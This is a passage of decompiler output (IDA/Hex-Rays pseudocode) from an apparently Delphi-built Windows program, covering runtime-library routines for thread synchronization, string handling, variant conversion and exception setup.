// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);
// 40591C: using guessed type __int64 System::__linkproc__ BeforeDestruction(void);

//----- (0041C0C4) --------------------------------------------------------
BOOL __fastcall sub_41C0C4(int a1)
{
  return ResetEvent(*(HANDLE *)(a1 + 16));
}

//----- (0041C0D0) --------------------------------------------------------
BOOL __fastcall sub_41C0D0(int a1)
{
  return SetEvent(*(HANDLE *)(a1 + 16));
}

//----- (0041C108) --------------------------------------------------------
signed __int32 __fastcall sub_41C108(volatile signed __int32 *a1, unsigned int a2)
{
  return _InterlockedExchangeAdd(a1, a2);
}

//----- (0041C118) --------------------------------------------------------
int __usercall sub_41C118@<eax>(Sysutils::TMultiReadExclusiveWriteSynchronizer *this@<eax>, int a2@<ebx>)
{
  DWORD CurrentThreadId_0; // edi
  bool v4; // bl
  signed __int32 v5; // eax
  int *v7; // [esp+0h] [ebp-18h] BYREF
  int v8; // [esp+4h] [ebp-14h]

  LOBYTE(a2) = 1;
  CurrentThreadId_0 = GetCurrentThreadId_0();
  if ( CurrentThreadId_0 != *((_DWORD *)this + 9) )
  {
    sub_41C0C4((int)this);
    v8 = *((_DWORD *)this + 10);
    sub_41BF54(*((Sysutils::TThreadLocalCounter **)this + 8), &v7);
    v4 = v7[3] != 0;
    if ( v7[3] )
      _InterlockedExchangeAdd((volatile signed __int32 *)this + 3, 1u);
    while ( sub_41C108((volatile signed __int32 *)this + 3, 0xFFFF0001) != 0xFFFF )
    {
      if ( sub_41C108((volatile signed __int32 *)this + 3, 0xFFFFu) )
        Sysutils::TMultiReadExclusiveWriteSynchronizer::WaitForWriteSignal(this);
    }
    sub_41C0C4((int)this);
    if ( v4 )
      _InterlockedExchangeAdd((volatile signed __int32 *)this + 3, 0xFFFFFFFF);
    *((_DWORD *)this + 9) = CurrentThreadId_0;
    v5 = _InterlockedExchangeAdd((volatile signed __int32 *)this + 10, 1u);
    LOBYTE(a2) = v5 == v8;
  }
  ++*((_DWORD *)this + 7);
  return a2;
}

//----- (0041C1D0) --------------------------------------------------------
int *__fastcall sub_41C1D0(Sysutils::TMultiReadExclusiveWriteSynchronizer *this, int a2, int *a3)
{
  int *result; // eax
  int *v5[2]; // [esp+0h] [ebp-8h] BYREF

  v5[0] = a3;
  sub_41BF54(*((Sysutils::TThreadLocalCounter **)this + 8), v5);
  if ( !--*((_DWORD *)this + 7) )
  {
    *((_DWORD *)this + 9) = 0;
    _InterlockedExchangeAdd((volatile signed __int32 *)this + 3, 0xFFFFu);
    Sysutils::TMultiReadExclusiveWriteSynchronizer::UnblockOneWriter(this);
    sub_41C0D0((int)this);
  }
  result = v5[0];
  if ( !v5[0][3] )
    return (int *)Sysutils::TThreadLocalCounter::Delete(*((_DWORD *)this + 8), v5);
  return result;
}
// 41BFBC: using guessed type int __fastcall Sysutils::TThreadLocalCounter::Delete(_DWORD, _DWORD);

//----- (0041C298) --------------------------------------------------------
int __fastcall sub_41C298(Sysutils::TMultiReadExclusiveWriteSynchronizer *this, int a2, int *a3)
{
  int result; // eax
  int v5; // ecx
  int *v6[2]; // [esp+0h] [ebp-8h] BYREF

  v6[0] = a3;
  sub_41BF54(*((Sysutils::TThreadLocalCounter **)this + 8), v6);
  --v6[0][3];
  result = (int)v6[0];
  if ( !v6[0][3] )
  {
    Sysutils::TThreadLocalCounter::Delete(*((_DWORD *)this + 8), v6);
    result = GetCurrentThreadId_0();
    if ( result != *((_DWORD *)this + 9) )
    {
      v5 = _InterlockedIncrement((volatile signed __int32 *)this + 3);
      if ( v5 == 0xFFFF )
        return Sysutils::TMultiReadExclusiveWriteSynchronizer::UnblockOneWriter(this);
      if ( v5 <= 0 )
      {
        result = v5 / 0xFFFF;
        if ( !(v5 % 0xFFFF) )
          return Sysutils::TMultiReadExclusiveWriteSynchronizer::UnblockOneWriter(this);
      }
    }
  }
  return result;
}
// 41BFBC: using guessed type int __fastcall Sysutils::TThreadLocalCounter::Delete(_DWORD, _DWORD);

//----- (0041C314) --------------------------------------------------------
int __fastcall sub_41C314(int *a1)
{
  int result; // eax

  result = *a1;
  if ( result )
    return *(_DWORD *)(result - 4);
  return result;
}

//----- (0041C320) --------------------------------------------------------
int __fastcall sub_41C320(int a1, int a2, int a3, int a4, int cchCount2, char a6)
{
  return sub_41C49C(a1, a2, a3, a4, cchCount2, a6, Locale);
}

//----- (0041C344) --------------------------------------------------------
int __fastcall sub_41C344(int a1, int a2, int a3, int a4, int cchCount1, int cchCount2, char a7, LCID Locale)
{
  if ( a7 )
    return sub_41C3F8(a1, a2, a3, a4, cchCount1, cchCount2, 4u, Locale);
  else
    return sub_41C3F8(a1, a2, a3, a4, cchCount1, cchCount2, 0, Locale);
}

//----- (0041C3F8) --------------------------------------------------------
int __fastcall sub_41C3F8(
        int a1,
        int a2,
        int a3,
        int a4,
        int cchCount1,
        int cchCount2,
        unsigned __int16 a7,
        LCID Locale)
{
  int v9; // edx
  bool v10; // al
  int v11; // eax
  int v12; // eax
  int v14; // eax
  DWORD v15; // eax
  int v17; // [esp+Ch] [ebp-4h]

  v17 = a1;
  v9 = a1;
  if ( a1 )
    a1 = *(_DWORD *)(a1 - 4);
  if ( a1 )
  {
    v11 = a3;
    if ( a3 )
      v11 = *(_DWORD *)(a3 - 4);
    v10 = v11 == 0;
  }
  else
  {
    v10 = 1;
  }
  if ( v10 )
  {
    v12 = v9;
    if ( v9 )
      v12 = *(_DWORD *)(v9 - 4);
    if ( v12 <= 0 )
    {
      v14 = a3;
      if ( a3 )
        v14 = *(_DWORD *)(a3 - 4);
      if ( v14 <= 0 )
        return 0;
      else
        return -1;
    }
    else
    {
      return 1;
    }
  }
  else
  {
    v15 = sub_41C398(a7);
    return CompareStringW(Locale, v15, (LPCWSTR)(v17 + 2 * a2), cchCount1, (LPCWSTR)(a3 + 2 * a4), cchCount2) - 2;
  }
}
// 41C398: using guessed type int __fastcall sub_41C398(_DWORD);

//----- (0041C49C) --------------------------------------------------------
int __fastcall sub_41C49C(int a1, int a2, int a3, int a4, int cchCount2, char a6, LCID Locale)
{
  return sub_41C344(a1, a2, a3, a4, cchCount2, cchCount2, a6, Locale);
}

//----- (0041C4C0) --------------------------------------------------------
bool __fastcall sub_41C4C0(int *a1, int a2)
{
  return (int)sub_407B7C(a2, *a1, 1) > 0;
}

//----- (0041C4DC) --------------------------------------------------------
int __fastcall sub_41C4DC(int a1, int a2, int a3, int a4, int *a5)
{
  void *v6; // eax

  sub_407890(a5, a4, a3);
  v6 = (void *)sub_407790(*a5);
  return System::Move((const void *)(a1 + 2 * a3), v6, 2 * a4);
}

//----- (0041C518) --------------------------------------------------------
int __fastcall sub_41C518(void *a1, int a2, int *a3)
{
  int v5; // edi
  void *v6; // eax

  v5 = a2 + 1;
  sub_407890(a3, a2 + 1, (int)a3);
  v6 = (void *)sub_407790(*a3);
  return System::Move(a1, v6, 2 * v5);
}

//----- (0041C548) --------------------------------------------------------
int __fastcall sub_41C548(_DWORD *a1, int a2)
{
  return *(unsigned __int16 *)(*a1 + 2 * a2);
}

//----- (0041C550) --------------------------------------------------------
int __fastcall sub_41C550(int *a1, int a2)
{
  int v2; // eax
  int v3; // edx
  int v4; // esi
  int v5; // eax
  int v6; // ecx

  v2 = *a1;
  if ( v2 )
    v2 = *(_DWORD *)(v2 - 4);
  v3 = v2 - 1;
  if ( v2 - 1 < 0 )
    return -1;
  while ( 1 )
  {
    v4 = a2;
    if ( a2 )
      v4 = *(_DWORD *)(a2 - 4);
    if ( v4 - 1 >= 0 )
      break;
LABEL_11:
    if ( --v3 < 0 )
      return -1;
  }
  v5 = v4;
  v6 = 0;
  while ( *(_WORD *)(a2 + 2 * v6) != *(_WORD *)(*a1 + 2 * v3) )
  {
    ++v6;
    if ( !--v5 )
      goto LABEL_11;
  }
  return v3;
}

//----- (0041C5B4) --------------------------------------------------------
_DWORD *__fastcall sub_41C5B4(int *a1, int a2, _DWORD *a3)
{
  int v3; // ebx

  v3 = *a1;
  if ( *a1 )
    v3 = *(_DWORD *)(v3 - 4);
  return sub_407AD8(*a1, a2 + 1, v3, a3);
}

//----- (0041C5E4) --------------------------------------------------------
_DWORD *__fastcall sub_41C5E4(int *a1, int a2, int a3, _DWORD *a4)
{
  return sub_407AD8(*a1, a2 + 1, a3, a4);
}

//----- (0041C608) --------------------------------------------------------
_DWORD *__fastcall sub_41C608(int *a1, volatile __int32 *a2)
{
  int v2; // eax
  int v3; // esi
  int v4; // ebx
  unsigned int v6[2]; // [esp-18h] [ebp-2Ch] BYREF
  int *v7; // [esp-10h] [ebp-24h]
  unsigned int v8[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v9; // [esp-4h] [ebp-18h]
  volatile __int32 *v10; // [esp+8h] [ebp-Ch]
  int *v11; // [esp+Ch] [ebp-8h]
  int v12; // [esp+10h] [ebp-4h] BYREF
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v12 = 0;
  v10 = a2;
  v11 = a1;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_41C6F6;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v2 = *a1;
  if ( v2 )
    v2 = *(_DWORD *)(v2 - 4);
  v3 = v2 - 1;
  v4 = 0;
  if ( v2 - 1 <= -1 || *(_WORD *)*v11 <= 0x20u || *(_WORD *)(*v11 + 2 * v3) <= 0x20u )
  {
    while ( v3 >= v4 && *(_WORD *)(*v11 + 2 * v4) <= 0x20u )
      ++v4;
    if ( v3 >= v4 )
    {
      while ( *(_WORD *)(*v11 + 2 * v3) <= 0x20u )
        --v3;
      v7 = &savedregs;
      v6[1] = (unsigned int)&loc_41C6D9;
      v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)v6);
      sub_407AD8(*v11, v4 + 1, v3 - v4 + 1, &v12);
      sub_406FE8(v10, v12);
      __writefsdword(0, v6[0]);
      v7 = (int *)&loc_41C6E0;
      sub_406C44(&v12);
    }
    else
    {
      sub_406C44(v10);
    }
  }
  else
  {
    sub_406FE8(v10, *v11);
  }
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_41C6FD;
  return sub_406C44(&v12);
}

//----- (0041C704) --------------------------------------------------------
bool sub_41C704()
{
  struct _OSVERSIONINFOEXW VersionInformation; // [esp+0h] [ebp-124h] BYREF
  DWORDLONG dwlConditionMask; // [esp+11Ch] [ebp-8h]

  sub_4051B8(&VersionInformation, 284, 0);
  VersionInformation.wProductType = 1;
  dwlConditionMask = VerSetConditionMask(0i64, 0x80u, 1u);
  return !VerifyVersionInfoW(&VersionInformation, 0x80u, dwlConditionMask);
}

//----- (0041C9EC) --------------------------------------------------------
int __usercall sub_41C9EC@<eax>(long double a1@<st0>)
{
  int v1; // eax
  int v2; // edx
  int v3; // edx
  int result; // eax
  unsigned int v5[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v5[2] = (unsigned int)&savedregs;
  v5[1] = (unsigned int)&loc_41CAD5;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  if ( !++dword_46C790 )
  {
    sub_405598((_DWORD *)dword_46C7A0);
    sub_409F14((int)sub_41BC58);
    sub_41BC28();
    sub_41BE44();
    v1 = sub_41B2D0(a1);
    nullsub_5(v1);
    sub_406C44(&dword_465DB8);
    System::__linkproc__ WStrClr(&unk_465DBC, v2);
    sub_406C68(&dword_465DC0);
    sub_406C44(&dword_465DD4);
    sub_407DEC((int)&unk_46C698, (int)&byte_413DFC);
    sub_408B34(&dword_46C764, (int)&byte_414174);
    sub_408B34(&dword_46C768, (int)&byte_4141A4);
    sub_406C44(&off_465E28);
    sub_407DEC((int)&dword_46C798, (int)&byte_419B94);
    sub_408B34(&dword_46E89C, (int)dword_4147C4);
    sub_406C44(&dword_466564);
    sub_406818(&dword_41C780, v3);
  }
  result = 0;
  __writefsdword(0, v5[0]);
  return result;
}
// 41CA40: variable 'v2' is possibly undefined
// 41CAC2: variable 'v3' is possibly undefined
// 406C8C: using guessed type int __fastcall System::__linkproc__ WStrClr(_DWORD, _DWORD);
// 413DFC: using guessed type char byte_413DFC;
// 414174: using guessed type char byte_414174;
// 4141A4: using guessed type char byte_4141A4;
// 4147C4: using guessed type int dword_4147C4[6];
// 419B94: using guessed type char byte_419B94;
// 41B9FC: using guessed type int __fastcall nullsub_5(_DWORD);
// 41C780: using guessed type int dword_41C780;
// 465DB8: using guessed type _DWORD dword_465DB8;
// 465DC0: using guessed type _DWORD dword_465DC0;
// 465DD4: using guessed type _DWORD dword_465DD4;
// 465E28: using guessed type int *off_465E28;
// 466564: using guessed type _DWORD dword_466564;
// 46C764: using guessed type int dword_46C764;
// 46C768: using guessed type int dword_46C768;
// 46C790: using guessed type int dword_46C790;
// 46C798: using guessed type int dword_46C798;
// 46C7A0: using guessed type int dword_46C7A0;
// 46E89C: using guessed type _DWORD dword_46E89C;

//----- (0041CB00) --------------------------------------------------------
HRESULT __stdcall sub_41CB00(VARIANTARG *pvargDest, VARIANTARG *pvarSrc, int a3, __int16 a4, VARTYPE vt)
{
  HRESULT result; // eax

  if ( a3 != 1024 )
    return -2147467263;
  result = VariantChangeType(pvargDest, pvarSrc, a4, vt);
  if ( result == -2147352571 && (vt & 0x2000) == 0x2000 )
    return -2147352568;
  return result;
}

//----- (0041CBD8) --------------------------------------------------------
int __stdcall sub_41CBD8(int a1, int a2, int a3, float *a4)
{
  int v4; // ebx
  unsigned int v6[2]; // [esp-10h] [ebp-14h] BYREF
  int *v7; // [esp-8h] [ebp-Ch]
  int v8; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v8 = 0;
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_41CC38;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  if ( a2 == 1024 )
  {
    unknown_libname_50(&v8, a1);
    v4 = dword_46657C[sub_4174F8(v8, a4) & 0x7F];
  }
  else
  {
    v4 = -2147467263;
  }
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_41CC3F;
  sub_406C44(&v8);
  return v4;
}
// 4077E8: using guessed type int __fastcall unknown_libname_50(_DWORD, _DWORD);
// 46657C: using guessed type int dword_46657C[];

//----- (0041CC48) --------------------------------------------------------
int __stdcall sub_41CC48(int a1, int a2, int a3, double *a4)
{
  int v4; // ebx
  unsigned int v6[2]; // [esp-10h] [ebp-14h] BYREF
  int *v7; // [esp-8h] [ebp-Ch]
  int v8; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v8 = 0;
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_41CCA8;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  if ( a2 == 1024 )
  {
    unknown_libname_50(&v8, a1);
    v4 = dword_46657C[sub_4174B4(v8, a4) & 0x7F];
  }
  else
  {
    v4 = -2147467263;
  }
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_41CCAF;
  sub_406C44(&v8);
  return v4;
}
// 4077E8: using guessed type int __fastcall unknown_libname_50(_DWORD, _DWORD);
// 46657C: using guessed type int dword_46657C[];

//----- (0041CCB8) --------------------------------------------------------
int __userpurge sub_41CCB8@<eax>(int a1@<ebx>, int a2, int a3, int a4, double *a5)
{
  int v5; // ebx
  unsigned int v7[2]; // [esp-10h] [ebp-14h] BYREF
  int *v8; // [esp-8h] [ebp-Ch]
  int v9; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v9 = 0;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_41CD18;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  if ( a3 == 1024 )
  {
    unknown_libname_50(&v9, a2);
    v5 = dword_46657C[sub_4192D8(v9, a5, off_46811C, a1) & 0x7F];
  }
  else
  {
    v5 = -2147467263;
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_41CD1F;
  sub_406C44(&v9);
  return v5;
}
// 4077E8: using guessed type int __fastcall unknown_libname_50(_DWORD, _DWORD);
// 46657C: using guessed type int dword_46657C[];

//----- (0041CD28) --------------------------------------------------------
int __stdcall sub_41CD28(int a1, int a2, int a3, int a4)
{
  int v4; // ebx
  unsigned int v6[2]; // [esp-10h] [ebp-14h] BYREF
  int *v7; // [esp-8h] [ebp-Ch]
  int v8; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v8 = 0;
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_41CD88;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  if ( a2 == 1024 )
  {
    unknown_libname_50(&v8, a1);
    v4 = dword_46657C[sub_41753C() & 0x7F];
  }
  else
  {
    v4 = -2147467263;
  }
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_41CD8F;
  sub_406C44(&v8);
  return v4;
}
// 4077E8: using guessed type int __fastcall unknown_libname_50(_DWORD, _DWORD);
// 46657C: using guessed type int dword_46657C[];

//----- (0041CE18) --------------------------------------------------------
int __fastcall sub_41CE18(int a1, int a2, int a3, _DWORD *a4, int a5, int a6, char a7, int a8)
{
  int v8; // ebx
  unsigned int v10[2]; // [esp-1Ch] [ebp-20h] BYREF
  int *v11; // [esp-14h] [ebp-18h]
  unsigned int v12[2]; // [esp-10h] [ebp-14h] BYREF
  int *v13; // [esp-8h] [ebp-Ch]
  int v14; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v14 = 0;
  if ( a4 )
    *a4 = 0;
  v13 = &savedregs;
  v12[1] = (unsigned int)&loc_41CEA8;
  v12[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  if ( a6 == 1024 )
  {
    v11 = &savedregs;
    v10[1] = (unsigned int)&loc_41CE89;
    v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v10);
    sub_41740C(off_46811C, &v14, a3, a7, a8);
    System::__linkproc__ WStrFromLStr(a4, v14);
    __writefsdword(0, v10[0]);
    v11 = (int *)&loc_41CE90;
    sub_406C44(&v14);
    v8 = 0;
  }
  else
  {
    v8 = -2147467263;
  }
  __writefsdword(0, v12[0]);
  v13 = (int *)&loc_41CEAF;
  sub_406C44(&v14);
  return v8;
}
// 407874: using guessed type int __fastcall System::__linkproc__ WStrFromLStr(_DWORD, _DWORD);

//----- (0041CEB8) --------------------------------------------------------
int __stdcall sub_41CEB8(int a1, int a2, int a3, int a4, _DWORD *a5)
{
  int v5; // ebx
  unsigned int v7[2]; // [esp-1Ch] [ebp-20h] BYREF
  int *v8; // [esp-14h] [ebp-18h]
  unsigned int v9[2]; // [esp-10h] [ebp-14h] BYREF
  int *v10; // [esp-8h] [ebp-Ch]
  int v11; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v11 = 0;
  if ( a5 )
    *a5 = 0;
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_41CF48;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  if ( a3 == 1024 )
  {
    v8 = &savedregs;
    v7[1] = (unsigned int)&loc_41CF29;
    v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v7);
    Sysutils::DateTimeToStr(a1, a2);
    System::__linkproc__ WStrFromLStr(a5, v11);
    __writefsdword(0, v7[0]);
    v8 = (int *)&loc_41CF30;
    sub_406C44(&v11);
    v5 = 0;
  }
  else
  {
    v5 = -2147467263;
  }
  __writefsdword(0, v9[0]);
  v10 = (int *)&loc_41CF4F;
  sub_406C44(&v11);
  return v5;
}
// 407874: using guessed type int __fastcall System::__linkproc__ WStrFromLStr(_DWORD, _DWORD);
// 418A74: using guessed type _DWORD __stdcall Sysutils::DateTimeToStr(_DWORD, _DWORD);

//----- (0041CF58) --------------------------------------------------------
int __stdcall sub_41CF58(__int16 a1, int a2, int a3, _DWORD *a4)
{
  int v4; // ebx
  unsigned int v6[2]; // [esp-10h] [ebp-14h] BYREF
  int *v7; // [esp-8h] [ebp-Ch]
  int v8; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v8 = 0;
  if ( a4 )
    *a4 = 0;
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_41CFBC;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  if ( a2 == 1024 )
  {
    Sysutils::BoolToStr(a1 != 0, 1);
    System::__linkproc__ WStrFromLStr(a4, v8);
    v4 = 0;
  }
  else
  {
    v4 = -2147467263;
  }
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_41CFC3;
  sub_406C44(&v8);
  return v4;
}
// 407874: using guessed type int __fastcall System::__linkproc__ WStrFromLStr(_DWORD, _DWORD);

//----- (0041E1D4) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *__usercall sub_41E1D4@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int v3; // edx
  int v4; // eax
  _DWORD v6[2]; // [esp-Ch] [ebp-10h] BYREF
  void **v7; // [esp-4h] [ebp-8h]
  int v8; // [esp+0h] [ebp-4h] BYREF
  void *savedregs; // [esp+4h] [ebp+0h] BYREF

  v8 = 0;
  v7 = &savedregs;
  v6[1] = &loc_41E21E;
  v6[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_40B51C((int **)off_468048, &v8);
  LOBYTE(v3) = 1;
  v4 = unknown_libname_85(off_41DA04, v3, v8);
  sub_406340(v4, a1, (int)&savedregs, a2, a3);
  __writefsdword(0, (unsigned int)v7);
  savedregs = &loc_41E225;
  return sub_406C44(&v8);
}
// 41E218: bad sp value at call
// 41E1FE: variable 'v3' is possibly undefined
// 41A744: using guessed type int __fastcall unknown_libname_85(_DWORD, _DWORD, _DWORD);
// 41DA04: using guessed type int (*off_41DA04[2])();

//----- (0041E228) --------------------------------------------------------
int __usercall sub_41E228@<eax>(int a1@<eax>, int a2@<edx>, int a3@<edi>)
{
  int v5; // ecx
  int v6; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-30h] BYREF
  void *v9; // [esp-8h] [ebp-2Ch]
  int *v10; // [esp-4h] [ebp-28h]
  void *v11; // [esp+0h] [ebp-24h]
  int v12; // [esp+8h] [ebp-1Ch] BYREF
  int v13; // [esp+Ch] [ebp-18h] BYREF
  int v14; // [esp+10h] [ebp-14h] BYREF
  int v15; // [esp+14h] [ebp-10h] BYREF
  char v16; // [esp+18h] [ebp-Ch]
  int v17; // [esp+1Ch] [ebp-8h]
  char v18; // [esp+20h] [ebp-4h]
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v14 = 0;
  v13 = 0;
  v12 = 0;
  v10 = &savedregs;
  v9 = &loc_41E2B7;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_420AB4(a1, &v14, 0, a1, a3, a2);
  v15 = v14;
  v16 = 17;
  sub_420AB4(a2, &v13, v5, a1, a3, a2);
  v17 = v13;
  v18 = 17;
  sub_40B51C((int **)off_467EA0, &v12);
  v6 = Sysutils::Exception::Exception(1, &v15);
  sub_406340(v6, a1, (int)&savedregs, a3, a2);
  __writefsdword(0, (unsigned int)v9);
  v11 = &loc_41E2BE;
  return sub_406CA4((int)&v12, 3);
}
// 41E266: variable 'v5' is possibly undefined
// 41A780: using guessed type _DWORD __stdcall Sysutils::Exception::Exception(_DWORD, _DWORD);

//----- (0041E2C4) --------------------------------------------------------
// attributes: thunk
_DWORD *__usercall sub_41E2C4@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  return sub_41E1D4(a1, a2, a3);
}

//----- (0041E2CC) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *__usercall sub_41E2CC@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int v3; // edx
  int v4; // eax
  _DWORD v6[2]; // [esp-Ch] [ebp-10h] BYREF
  void **v7; // [esp-4h] [ebp-8h]
  int v8; // [esp+0h] [ebp-4h] BYREF
  void *savedregs; // [esp+4h] [ebp+0h] BYREF

  v8 = 0;
  v7 = &savedregs;
  v6[1] = &loc_41E316;
  v6[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_40B51C((int **)off_468014, &v8);
  LOBYTE(v3) = 1;
  v4 = unknown_libname_85(off_41D944, v3, v8);
  sub_406340(v4, a1, (int)&savedregs, a2, a3);
  __writefsdword(0, (unsigned int)v7);
  savedregs = &loc_41E31D;
  return sub_406C44(&v8);
}
// 41E310: bad sp value at call
// 41E2F6: variable 'v3' is possibly undefined
// 41A744: using guessed type int __fastcall unknown_libname_85(_DWORD, _DWORD, _DWORD);
// 41D944: using guessed type int (*off_41D944[2])();

//----- (0041E320) --------------------------------------------------------
int __usercall sub_41E320@<eax>(int a1@<eax>, int a2@<edx>, int a3@<edi>)
{
  int v5; // ecx
  int v6; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-30h] BYREF
  void *v9; // [esp-8h] [ebp-2Ch]
  int *v10; // [esp-4h] [ebp-28h]
  void *v11; // [esp+0h] [ebp-24h]
  int v12; // [esp+8h] [ebp-1Ch] BYREF
  int v13; // [esp+Ch] [ebp-18h] BYREF
  int v14; // [esp+10h] [ebp-14h] BYREF
  int v15; // [esp+14h] [ebp-10h] BYREF
  char v16; // [esp+18h] [ebp-Ch]
  int v17; // [esp+1Ch] [ebp-8h]
  char v18; // [esp+20h] [ebp-4h]
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v14 = 0;
  v13 = 0;
  v12 = 0;
  v10 = &savedregs;
  v9 = &loc_41E3AF;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_420AB4(a1, &v14, 0, a1, a3, a2);
  v15 = v14;
  v16 = 17;
  sub_420AB4(a2, &v13, v5, a1, a3, a2);
  v17 = v13;
  v18 = 17;
  sub_40B51C((int **)off_4680C0, &v12);
  v6 = Sysutils::Exception::Exception(1, &v15);
  sub_406340(v6, a1, (int)&savedregs, a3, a2);
  __writefsdword(0, (unsigned int)v9);
  v11 = &loc_41E3B6;
  return sub_406CA4((int)&v12, 3);
}
// 41E35E: variable 'v5' is possibly undefined
// 41A780: using guessed type _DWORD __stdcall Sysutils::Exception::Exception(_DWORD, _DWORD);

//----- (0041E3BC) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *__usercall sub_41E3BC@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int v3; // edx
  int v4; // eax
  _DWORD v6[2]; // [esp-Ch] [ebp-10h] BYREF
  void **v7; // [esp-4h] [ebp-8h]
  int v8; // [esp+0h] [ebp-4h] BYREF
  void *savedregs; // [esp+4h] [ebp+0h] BYREF

  v8 = 0;
  v7 = &savedregs;
  v6[1] = &loc_41E406;
  v6[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_40B51C((int **)off_467FE0, &v8);
  LOBYTE(v3) = 1;
  v4 = unknown_libname_85(off_41DE78, v3, v8);
  sub_406340(v4, a1, (int)&savedregs, a2, a3);
  __writefsdword(0, (unsigned int)v7);
  savedregs = &loc_41E40D;
  return sub_406C44(&v8);
}
// 41E400: bad sp value at call
// 41E3E6: variable 'v3' is possibly undefined
// 41A744: using guessed type int __fastcall unknown_libname_85(_DWORD, _DWORD, _DWORD);
// 41DE78: using guessed type int (*off_41DE78[2])();

//----- (0041E6A4) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *__usercall sub_41E6A4@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int v3; // edx
  int v4; // eax
  _DWORD v6[2]; // [esp-Ch] [ebp-10h] BYREF
  void **v7; // [esp-4h] [ebp-8h]
  int v8; // [esp+0h] [ebp-4h] BYREF
  void *savedregs; // [esp+4h] [ebp+0h] BYREF

  v8 = 0;
  v7 = &savedregs;
  v6[1] = &loc_41E6EE;
  v6[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_40B51C((int **)off_467E98, &v8);
  LOBYTE(v3) = 1;
  v4 = unknown_libname_85(off_41E170, v3, v8);
  sub_406340(v4, a1, (int)&savedregs, a2, a3);
  __writefsdword(0, (unsigned int)v7);
  savedregs = &loc_41E6F5;
  return sub_406C44(&v8);
}
// 41E6E8: bad sp value at call
// 41E6CE: variable 'v3' is possibly undefined
// 41A744: using guessed type int __fastcall unknown_libname_85(_DWORD, _DWORD, _DWORD);
// 41E170: using guessed type int (*off_41E170[2])();

//----- (0041E6F8) --------------------------------------------------------
int __fastcall sub_41E6F8(SAFEARRAY *psa, UINT nDim)
{
  Variants *LBound; // eax
  int v5; // edx
  Variants *UBound; // eax
  int v7; // edx
  LONG plUbound; // [esp+8h] [ebp-8h] BYREF
